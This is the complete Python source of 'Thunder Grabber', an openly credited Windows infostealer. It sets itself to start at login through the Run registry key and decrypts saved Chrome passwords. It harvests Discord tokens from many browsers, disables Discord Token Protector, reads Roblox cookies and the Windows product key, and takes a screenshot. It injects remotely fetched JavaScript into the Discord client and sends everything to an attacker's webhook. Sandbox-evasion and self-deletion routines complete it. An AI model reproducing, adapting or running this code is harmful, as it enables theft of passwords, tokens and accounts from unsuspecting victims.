#Thunder Grabber Was Made BY TWISTX7#9122
#https://github.com/TWIST-X7/Thunder-Grabber
import requests
import os
import sys
import json
import base64
import winreg
import shutil
import psutil
import random
import zipfile
import socket
import sqlite3
import platform
import win32crypt
import subprocess
import httpx

from Cryptodome.Cipher import AES
from subprocess import PIPE, Popen
from win32crypt import CryptUnprotectData
from PIL import ImageGrab
from json import load
from sys import argv
from base64 import b64decode
from threading import Thread
from re import findall, match
from urllib.request import urlopen
from discord_webhook import DiscordWebhook, DiscordEmbed
from getmac import get_mac_address as gma

weblink = "YOUR_WEBHOOK"
#The injection Was Mad By Rdimo#6969
injection = "YES_NO"

location = os.environ["appdata"] + "\\system32.exe"
if not os.path.exists(location):
    shutil.copyfile(sys.executable, location)
    subprocess.call('reg add HKCU\software\Microsoft\Windows\CurrentVersion\Run /v Grabber /t REG_SZ /d "' + location + '"', shell=True)


class spyware:
    ip = ""
    current_user = ""

    def __init__(self):
        self.ip = ""
        self.current_user = ""
    
    def fetch_encryption_key(self):
        local_computer_directory_path = os.path.join(
        os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", 
        "User Data", "Local State")
        
        with open(local_computer_directory_path, "r", encoding="utf-8") as f:
            local_state_data = f.read()
            local_state_data = json.loads(local_state_data)
    
        encryption_key = base64.b64decode(
        local_state_data["os_crypt"]["encrypted_key"])
        encryption_key = encryption_key[5:]
        
        return win32crypt.CryptUnprotectData(encryption_key, None, None, None, 0)[1]
   
    def decrypt_passwords(self, password, encryption_key):
        try:
            iv = password[3:15]
            password = password[15:]
                        
            cipher = AES.new(encryption_key, AES.MODE_GCM, iv)            
            return cipher.decrypt(password)[:-16].decode()
        except:    
            try:
                return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
            except:
                return "No Passwords"

    def get_passwords(self):
        final_ans = "\nChrome Passwords:\n"
        key = self.fetch_encryption_key()
        db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                            "Google", "Chrome", "User Data", "default", "Login Data")
        
        filename = "ChromePasswords.db"
        shutil.copyfile(db_path, filename)        
        db = sqlite3.connect(filename)
        cursor = db.cursor()
                
        cursor.execute(
            "select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins "
            "order by date_last_used")
        
        for row in cursor.fetchall():
            main_url = row[0]
            login_url = row[1]
            username = row[2]
            password = self.decrypt_passwords(row[3], key)
            
            if username or password:                                    
                final_ans += f"Main URL: {main_url}\n"
                final_ans += f"Login URL: {login_url}\n"
                final_ans += f"Username: {username}\n"
                final_ans += f"Password: {password}\n\n"
            else:
                continue

            final_ans += "=" * 80 + "\n\n"

        cursor.close()
        db.close()
        
        try:            
            os.remove(filename)
        except:
            pass

        return final_ans

    def get_system_info(self):
        final_str = "\nSystem Information:\n"
        
        data_dictionary = {"IP-Address" : "", "Hostname" : "", "Platform:" : "", "Release-Data" : "", "Version" : "", "Processor" : "", "Architecture" : "", "Ram" : ""}
        data_dictionary["Platform:"] = platform.system()
        data_dictionary["Release-Data"] = platform.release()
        data_dictionary["Version"] = platform.version()
        data_dictionary["Architecture"] = platform.machine()
        data_dictionary["Hostname"] = socket.gethostname()
        data_dictionary["IP-Address"] = socket.gethostbyname(socket.gethostname())
        data_dictionary["Processor"] = platform.processor()
        data_dictionary["Ram"] = str(round(psutil.virtual_memory().total / (1024.0 **3))) +" GB"
        
        self.ip = data_dictionary["IP-Address"]
        for key, value in data_dictionary.items():
            final_str += "{}: {}\n".format(key, value)            

        return final_str

    def get_info(self):
        system_info = "THUNDER GRABBER MADE BY TWISTX7#9122 | https://github.com/TWIST-X7"
        try:
            system_info += self.get_system_info()
            system_info += self.get_passwords()

            return system_info
        except Exception:
            pass
  
  
    
        
class grabber:
    
    def __init__(self):

        self.baseurl = "https://discord.com/api/v9/users/@me"
        self.appdata = os.getenv("localappdata")
        self.roaming = os.getenv("appdata")
        self.regex = r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}"
        self.encrypted_regex = r"dQw4w9WgXcQ:[^\"]*"
        self.tokens = []
        self.robloxcookies = []
        self.startup = self.roaming + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\"
        self.sep = os.sep
        
        #Thread(target=self.killDiscord).start()
        self.bypassTokenProtector()
        self.grabTokens()
        Thread(target=self.screenshot).start()
        self.grabRobloxCookie()
        #self.killDiscord()
        if injection == "y":
            self.injector()
        else:
            pass
        self.SendInfo()
        
    
    def getheaders(self, token=None, content_type="application/json"):
        headers = {
            "Content-Type": content_type,
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11"
        }
        if token:
            headers.update({"Authorization": token})
        return headers
    def killDiscord(self):
        for proc in psutil.process_iter():
            if any(procstr in proc.name().lower() for procstr in
                   ['discord', 'discordtokenprotector', 'discordcanary', 'discorddevelopment', 'discordptb']):
                try:
                    proc.kill()
                except (psutil.NoSuchProcess, psutil.AccessDenied):
                    pass
    
    def get_master_key(self, path):
        with open(path, "r", encoding="utf-8") as f:
            local_state = f.read()
        local_state = json.loads(local_state)

        master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        master_key = master_key[5:]
        master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
        return master_key
    
    
    
    def injector(self):
        for _dir in os.listdir(self.appdata):
            if 'discord' in _dir.lower():
                discord = self.appdata+self.sep+_dir
                disc_sep = discord+self.sep
                for __dir in os.listdir(os.path.abspath(discord)):
                    if match(r'app-(\d*\.\d*)*', __dir):
                        app = os.path.abspath(disc_sep+__dir)
                        inj_path = app+'\\modules\\discord_desktop_core-3\\discord_desktop_core\\'
                        if os.path.exists(inj_path):
                            if self.startup not in argv[0]:
                                try:
                                    os.makedirs(
                                        inj_path+'initiation', exist_ok=True)
                                except PermissionError:
                                    pass
                            f = httpx.get('https://raw.githubusercontent.com/TWIST-X7/Injection/main/Injection-clean.js').text.replace(
                                "%WEBHOOK%", weblink)
                            with open(inj_path+'index.js', 'w', errors="ignore") as indexFile:
                                indexFile.write(f)
                            os.startfile(app + self.sep + _dir + '.exe')
                        
    def killDiscord(self):
        for proc in psutil.process_iter():
            if any(procstr in proc.name().lower() for procstr in\
            ['discord', 'discordtokenprotector', 'discordcanary', 'discorddevelopment', 'discordptb']):
                try:
                    proc.kill()
                except psutil.NoSuchProcess:
                    pass
    
    def bypassTokenProtector(self):
        tp = f"{self.roaming}\\DiscordTokenProtector\\"
        config = tp+"config.json"
        for i in ["DiscordTokenProtector.exe", "ProtectionPayload.dll", "secure.dat"]:
            try:
                os.remove(tp+i)
            except Exception:
                pass 
        try:
            with open(config) as f:
                item = json.load(f)
                item['auto_start'] = False
                item['auto_start_discord'] = False
                item['integrity'] = False
                item['integrity_allowbetterdiscord'] = False
                item['integrity_checkexecutable'] = False
                item['integrity_checkhash'] = False
                item['integrity_checkmodule'] = False
                item['integrity_checkscripts'] = False
                item['integrity_checkresource'] = False
                item['integrity_redownloadhashes'] = False
                item['iterations_iv'] = 364
                item['iterations_key'] = 457
                item['version'] = 69420

            with open(config, 'w') as f:
                json.dump(item, f, indent=2, sort_keys=True)


        except Exception:
            pass
    
    def decrypt_payload(self, cipher, payload):
        return cipher.decrypt(payload)
    
    def generate_cipher(self, aes_key, iv):
        return AES.new(aes_key, AES.MODE_GCM, iv)
    
    def decrypt_password(self, buff, master_key):
        try:
            iv = buff[3:15]
            payload = buff[15:]
            cipher = self.generate_cipher(master_key, iv)
            decrypted_pass = self.decrypt_payload(cipher, payload)
            decrypted_pass = decrypted_pass[:-16].decode()
            return decrypted_pass
        except Exception:
            return "Failed to decrypt password"
        
                  
    def getProductKey(self, path: str = r'SOFTWARE\Microsoft\Windows NT\CurrentVersion'):
        def strToInt(x):
            if isinstance(x, str):
                return ord(x)
            return x
        chars = 'BCDFGHJKMPQRTVWXY2346789'
        wkey = ''
        offset = 52
        regkey = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE,path)
        val, _ = winreg.QueryValueEx(regkey, 'DigitalProductId')
        productName, _ = winreg.QueryValueEx(regkey, "ProductName")
        key = list(val)

        for i in range(24,-1, -1):
            temp = 0
            for j in range(14,-1,-1):
                temp *= 256
                try:
                    temp += strToInt(key[j+ offset])
                except IndexError:
                    return [productName, ""]
                if temp / 24 <= 255:
                    key[j+ offset] = temp/24
                else:
                    key[j+ offset] = 255
                temp = int(temp % 24)
            wkey = chars[temp] + wkey
        for i in range(5,len(wkey),6):
            wkey = wkey[:i] + '-' + wkey[i:]
        return [productName, wkey]
        
    def grabTokens(self):
        paths = {
            'Discord': self.roaming + r'\\discord\\Local Storage\\leveldb\\',
            'Discord Canary': self.roaming + r'\\discordcanary\\Local Storage\\leveldb\\',
            'Lightcord': self.roaming + r'\\Lightcord\\Local Storage\\leveldb\\',
            'Discord PTB': self.roaming + r'\\discordptb\\Local Storage\\leveldb\\',
            'Opera': self.roaming + r'\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\',
            'Opera GX': self.roaming + r'\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb\\',
            'Amigo': self.appdata + r'\\Amigo\\User Data\\Local Storage\\leveldb\\',
            'Torch': self.appdata + r'\\Torch\\User Data\\Local Storage\\leveldb\\',
            'Kometa': self.appdata + r'\\Kometa\\User Data\\Local Storage\\leveldb\\',
            'Orbitum': self.appdata + r'\\Orbitum\\User Data\\Local Storage\\leveldb\\',
            'CentBrowser': self.appdata + r'\\CentBrowser\\User Data\\Local Storage\\leveldb\\',
            '7Star': self.appdata + r'\\7Star\\7Star\\User Data\\Local Storage\\leveldb\\',
            'Sputnik': self.appdata + r'\\Sputnik\\Sputnik\\User Data\\Local Storage\\leveldb\\',
            'Vivaldi': self.appdata + r'\\Vivaldi\\User Data\\Default\\Local Storage\\leveldb\\',
            'Chrome SxS': self.appdata + r'\\Google\\Chrome SxS\\User Data\\Local Storage\\leveldb\\',
            'Chrome': self.appdata + r'\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\',
            'Epic Privacy Browser': self.appdata + r'\\Epic Privacy Browser\\User Data\\Local Storage\\leveldb\\',
            'Microsoft Edge': self.appdata + r'\\Microsoft\\Edge\\User Data\\Defaul\\Local Storage\\leveldb\\',
            'Uran': self.appdata + r'\\uCozMedia\\Uran\\User Data\\Default\\Local Storage\\leveldb\\',
            'Yandex': self.appdata + r'\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb\\',
            'Brave': self.appdata + r'\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb\\',
            'Iridium': self.appdata + r'\\Iridium\\User Data\\Default\\Local Storage\\leveldb\\'
        }
        
        for name, path in paths.items():
            if not os.path.exists(path):
                continue
            disc = name.replace(" ", "").lower()
            if "cord" in path:
                if os.path.exists(self.roaming+f'\\{disc}\\Local State'):
                    for file_name in os.listdir(path):
                        if file_name[-3:] not in ["log", "ldb"]:
                            continue
                        for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                            for y in findall(self.encrypted_regex, line):
                                token = self.decrypt_password(b64decode(
                                    y.split('dQw4w9WgXcQ:')[1]), self.get_master_key(self.roaming+f'\\{disc}\\Local State'))
                                try:
                                    r = requests.get(self.baseurl, headers=self.getheaders(token))
                                except Exception:
                                    pass
                                if r.status_code == 200 and token not in self.tokens:
                                    self.tokens.append(token)
            else:
                for file_name in os.listdir(path):
                    if file_name[-3:] not in ["log", "ldb"]:
                        continue
                    for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                        for token in findall(self.regex, line):
                            try:
                                r = requests.get(self.baseurl, headers=self.getheaders(token))
                            except Exception:
                                pass
                            if r.status_code == 200 and token not in self.tokens:
                                self.tokens.append(token)

        if os.path.exists(self.roaming+"\\Mozilla\\Firefox\\Profiles"):
            for path, _, files in os.walk(self.roaming+"\\Mozilla\\Firefox\\Profiles"):
                for _file in files:
                    if not _file.endswith('.sqlite'):
                        continue
                    for line in [x.strip() for x in open(f'{path}\\{_file}', errors='ignore').readlines() if x.strip()]:
                        for token in findall(self.regex, line):
                            try:
                                r = requests.get(self.baseurl, headers=self.getheaders(token))
                            except Exception:
                                pass
                            if r.status_code == 200 and token not in self.tokens:
                                self.tokens.append(token)

                                    
    def screenshot(self):
        image = ImageGrab.grab(
            bbox=None, 
            include_layered_windows=False, 
            all_screens=False, 
            xdisplay=None
        )
        tempfolder = os.getenv("temp")+"\\Thunder"
        try:
            os.mkdir(os.path.join(tempfolder))
        except Exception:
            pass
        image.save(f'{tempfolder}\\Screenshot.png')
        image.close()
        
    def grabRobloxCookie(self):
        tempfolder = os.getenv("temp")+"\\Thunder"
        def subproc(path):
            try:
                return subprocess.check_output(
                    fr"powershell Get-ItemPropertyValue -Path {path}:SOFTWARE\Roblox\RobloxStudioBrowser\roblox.com -Name .ROBLOSECURITY",
                    creationflags=0x08000000).decode().rstrip()
            except Exception:
                return None
        try:
            reg_cookie = subproc(r'HKLM')
            if not reg_cookie:
                reg_cookie = subproc(r'HKCU')
            if reg_cookie:
                self.robloxcookies.append(reg_cookie)
            if self.robloxcookies:
                with open(f"{tempfolder}\\Roblox.txt", "w") as f6:
                    for i in self.robloxcookies:
                        f6.write(i+'\n')
        except :
            with open(f"{tempfolder}\\Roblox.txt", "w") as f9:
                        f9.write("No Roblox cookies found")
              
    def SendInfo(self):
        if self.tokens == None:
            pass
        else:    
            for token in self.tokens:                     
                headers = {
                        'Authorization': token,
                        'Content-Type': 'application/json'
                    }
                

                r = requests.get('https://discordapp.com/api/v9/users/@me', headers=headers)
                if r.status_code == 200:
                    r_json = r.json()
                    user_name = f'{r_json["username"]}#{r_json["discriminator"]}'
                    user_id = r_json['id']
                    avatar_id = r_json['avatar']
                    avatar_url = f"https://cdn.discordapp.com/avatars/{user_id}/{avatar_id}"
                    phone_number = r_json['phone']
                    email = r_json['email']
                    mfa_enabled = r_json['mfa_enabled']
                try:
                    nitro_data = requests.get(self.baseurl+'/billing/subscriptions', headers=self.getheaders(token)).json()
                except Exception:
                    pass
                has_nitro = False
                has_nitro = bool(len(nitro_data) > 0)
                try:
                    billing = bool(len(json.loads(requests.get(self.baseurl+"/billing/payment-sources", headers=self.getheaders(token)).text)) > 0)
                except Exception:
                    pass
                    
                data = requests.get("https://ipinfo.io/json").json()
                ip = data['ip']
                city = data['city']
                country = data['country']
                region = data['region']
                wname = self.getProductKey()[0]
                wkey = self.getProductKey()[1]
                mac = gma()
                hostname = socket.gethostname()
                webhook = DiscordWebhook(url=weblink, username="Thunder", avatar_url="https://assets.mofoprod.net/network/images/discord.width-250_rAsdmRA.jpg")
                
                embed = DiscordEmbed(title=f"💉 {user_name} Has Been Logged 💉",color=16777215)
                embed.set_author(name="⚡ Thunder Grabber ⚡", url='https://github.com/TWIST-X7')
                embed.add_embed_field(name='🧾 Account Inforamtion ', value=f"""```
[Username] : {user_name}\n[User ID] : {user_id}\n[Phone Number] : {phone_number}\n[Email] : {email}\n[2FA/MFA Enabled] : {mfa_enabled}\n[Nitro Status] : {has_nitro}\n[Payment Method] : {billing} ```""", inline=False)
                embed.add_embed_field(name='👨‍💻 User Information', value=f"""```
[Hostname] : {hostname}\n[IP Adresse] : {ip}\n[Mac Adresse] : {mac} \n[City] : {city}\n[Country] : {country}\n[Region] : {region}\n[Platform] : {wname}\n[Product Key] : {wkey if wkey else 'No Product Key'}```""")

                # set thumbnail
                embed.set_thumbnail(url=avatar_url)
                embed.add_embed_field(name='🔑Token', value="||"+token+"||", inline=False)

                # set footer
                embed.set_footer(text='Tokens')
                webhook.add_embed(embed)

                

                webhook.execute()
        try:
            tempfolder = os.getenv("temp")+"\\Thunder"
            f2 = open(f"{tempfolder}\\passwords.txt", "w")
            try:
                f2.write(spyware().get_info())
                f2.close()
            except:
                f2.write("Thunder Grabber Made By TWISTX7#9122 https://github.com/TWIST-X7/Thunder-Grabber\nNo Passwords Found")
                f2.close()
            appdata = os.getenv("localappdata")
            _zipfile = os.path.join(appdata, f'{os.getenv("UserName")}-Info.zip')
            zipped_file = zipfile.ZipFile(_zipfile, "w", zipfile.ZIP_DEFLATED)
            abs_src = os.path.abspath(tempfolder)
            for dirname, _, files in os.walk(tempfolder):
                for filename in files:
                    absname = os.path.abspath(os.path.join(dirname, filename))
                    arcname = absname[len(abs_src) + 1:]
                    zipped_file.write(absname, arcname)
            zipped_file.close()
            with open(_zipfile, 'rb') as f:
                httpx.post(weblink, files={'upload_file': f})
            shutil.rmtree(tempfolder)
            os.remove(f'{appdata}\\{os.getenv("UserName")}-Info.zip')
        except:
            pass
        
class debug:
    def __init__(self):
        if self.checks(): self.self_destruct()
    
    def checks(self):
        debugging = False 
        
        # blackList from Rdimo
        self.blackListedUsers = ["WDAGUtilityAccount","Abby","Peter Wilson","hmarc","patex","JOHN-PC","RDhJ0CNFevzX","kEecfMwgj","Frank","8Nl0ColNQ5bq","Lisa","John","george","PxmdUOpVyx","8VizSM","w0fjuOVmCcP5A","lmVwjj9b","PqONjHVwexsS","3u2v9m8","Julia","HEUeRzl",]
        self.blackListedPCNames = ["BEE7370C-8C0C-4","DESKTOP-NAKFFMT","WIN-5E07COS9ALR","B30F0242-1C6A-4","DESKTOP-VRSQLAG","Q9IATRKPRH","XC64ZB","DESKTOP-D019GDM","DESKTOP-WI8CLET","SERVER1","LISA-PC","JOHN-PC","DESKTOP-B0T93D6","DESKTOP-1PYKP29","DESKTOP-1Y2433R","WILEYPC","WORK","6C4E733F-C2D9-4","RALPHS-PC","DESKTOP-WG3MYJS","DESKTOP-7XC6GEZ","DESKTOP-5OV9S0O","QarZhrdBpj","ORELEEPC","ARCHIBALDPC","JULIA-PC","d1bnJkfVlH",]
        self.blackListedHWIDS = ["7AB5C494-39F5-4941-9163-47F54D6D5016","032E02B4-0499-05C3-0806-3C0700080009","03DE0294-0480-05DE-1A06-350700080009","11111111-2222-3333-4444-555555555555","6F3CA5EC-BEC9-4A4D-8274-11168F640058","ADEEEE9E-EF0A-6B84-B14B-B83A54AFC548","4C4C4544-0050-3710-8058-CAC04F59344A","00000000-0000-0000-0000-AC1F6BD04972","00000000-0000-0000-0000-000000000000","5BD24D56-789F-8468-7CDC-CAA7222CC121","49434D53-0200-9065-2500-65902500E439","49434D53-0200-9036-2500-36902500F022","777D84B3-88D1-451C-93E4-D235177420A7","49434D53-0200-9036-2500-369025000C65","B1112042-52E8-E25B-3655-6A4F54155DBF","00000000-0000-0000-0000-AC1F6BD048FE","EB16924B-FB6D-4FA1-8666-17B91F62FB37","A15A930C-8251-9645-AF63-E45AD728C20C","67E595EB-54AC-4FF0-B5E3-3DA7C7B547E3","C7D23342-A5D4-68A1-59AC-CF40F735B363","63203342-0EB0-AA1A-4DF5-3FB37DBB0670","44B94D56-65AB-DC02-86A0-98143A7423BF","6608003F-ECE4-494E-B07E-1C4615D1D93C","D9142042-8F51-5EFF-D5F8-EE9AE3D1602A","49434D53-0200-9036-2500-369025003AF0","8B4E8278-525C-7343-B825-280AEBCD3BCB","4D4DDC94-E06C-44F4-95FE-33A1ADA5AC27","79AF5279-16CF-4094-9758-F88A616D81B4",]
        self.blackListedIPS = ["88.132.231.71","78.139.8.50","20.99.160.173","88.153.199.169","84.147.62.12","194.154.78.160","92.211.109.160","195.74.76.222","188.105.91.116","34.105.183.68","92.211.55.199","79.104.209.33","95.25.204.90","34.145.89.174","109.74.154.90","109.145.173.169","34.141.146.114","212.119.227.151","195.239.51.59","192.40.57.234","64.124.12.162","34.142.74.220","188.105.91.173","109.74.154.91","34.105.72.241","109.74.154.92","213.33.142.50",]
        self.blacklistedProcesses = ["HTTP Toolkit.exe", "Fiddler.exe", "Wireshark.exe"]
        
        self.check_process()
        
        if self.get_ip(): debugging = True
        if self.get_hwid(): debugging = True
        if self.get_pcname(): debugging = True
        if self.get_username(): debugging = True
        
        return debugging

    def check_process(self):
        for process in self.blacklistedProcesses:
            if process in (p.name() for p in psutil.process_iter()):
                self.self_destruct()
        
    def get_ip(self):
        url = 'http://ipinfo.io/json'
        response = urlopen(url)
        data = load(response)
        ip = data['ip']
        
        if ip in self.blackListedIPS:
            return True
        
    def get_hwid(self):
        p = Popen("wmic csproduct get uuid", shell=True, stdin=PIPE, stdout=PIPE, stderr=PIPE)
        hwid = (p.stdout.read() + p.stderr.read()).decode().split("\n")[1]       
        
        if hwid in self.blackListedHWIDS:
            return True
        
    def get_pcname(self):
        pc_name = os.getenv("COMPUTERNAME")
        
        if pc_name in self.blackListedPCNames:
            return True
        
    def get_username(self):
        pc_username = os.getenv("UserName")
        
        if pc_username in self.blackListedUsers:
            return True
        
    def self_destruct(self):
        os.system("del {}\{}".format(os.path.dirname(__file__), os.path.basename(__file__)))
        exit()
                           
if __name__ == '__main__':
    if os.name != "nt":
        exit()
    
    debug()
    grabber()
